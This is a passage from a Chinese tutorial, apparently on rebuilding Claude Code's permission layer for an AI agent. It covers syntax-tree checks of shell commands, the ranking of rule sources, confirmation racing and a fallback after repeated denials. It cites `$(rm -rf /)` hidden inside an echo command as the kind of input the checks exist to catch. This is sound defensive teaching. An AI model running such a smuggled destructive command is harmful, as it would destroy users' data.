正则看到 `echo hello...`，以为是安全的 echo 命令。但实际执行时 `$(...)` 里的 `rm -rf /` 会先被执行。

tree-sitter 把命令解析成语法树（AST），能看到 `$(rm -rf /)` 是一个"命令替换"节点，里面包含危险的 `rm` 命令。对于它不理解的结构（变量展开、控制流等），一律标记为 `too-complex` 并要求用户确认——这叫 **FAIL-CLOSED** 原则：不确定就拦住，比放过去安全。

### 8 种规则来源的优先级

Claude Code 的权限规则有 8 个来源，严格按优先级排列：

```text
企业 MDM 策略（不可覆盖）
  > 用户全局 (~/.claude/settings.json)
    > 项目级（.claude/settings.json，提交到仓库）
      > 本地项目级（不提交）
        > CLI 参数
          > 运行时参数
            > 命令定义
              > 会话级（"始终允许"按钮产生）
```

低优先级不能覆盖高优先级——企业策略 deny 的操作，用户在任何层级写 allow 都无效。

我们的版本目前只有"会话级白名单"一个来源。配置文件规则系统（用户级 + 项目级）在后续章节补回。

### Layer 7 的竞速机制

Claude Code 的确认不是简单的 `input()`。它同时启动三个东西：

1. UI 对话框（用户点击）
2. PermissionRequest Hook（自动化脚本响应）
3. ML 分类器（机器学习模型判断）

三者竞速，第一个返回结果的生效。如果用户触碰了对话框，其他两个的结果直接丢弃——**人类意图永远优先**。

还有一个 200ms 的防误触宽限期：对话框弹出后 200ms 内的点击不算数，防止用户正好在敲键盘时无意中确认了危险操作。

### 拒绝后的降级机制

Claude Code 追踪拒绝次数：

- 连续被拒绝 3 次 → auto 模式降级为交互确认模式
- 总共被拒绝 20 次 → 中止整个 Agent 执行

这防止模型陷入"反复尝试被拒绝操作"的死循环。我们的版本没有这个机制，但可以作为进阶练习自行实现。

---

> **下一章**：Agent 对话越来越长，上下文窗口快满了——4 层压缩流水线让它看起来拥有无限记忆。
